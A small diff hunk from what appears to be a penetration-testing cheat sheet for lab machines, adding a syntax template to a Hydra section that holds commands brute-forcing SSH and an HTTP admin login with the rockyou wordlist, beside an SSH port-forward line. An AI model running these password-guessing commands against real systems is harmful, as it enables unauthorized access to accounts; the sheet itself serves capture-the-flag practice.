@@ -278,10 +278,10 @@ ssh -N -L 8080:hack.thm:8080 localhost
 
 ### Hydra
 
+```sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>```
 ```sh
 hydra -f -t 4 -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
 ```
-
 ```sh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
 ```
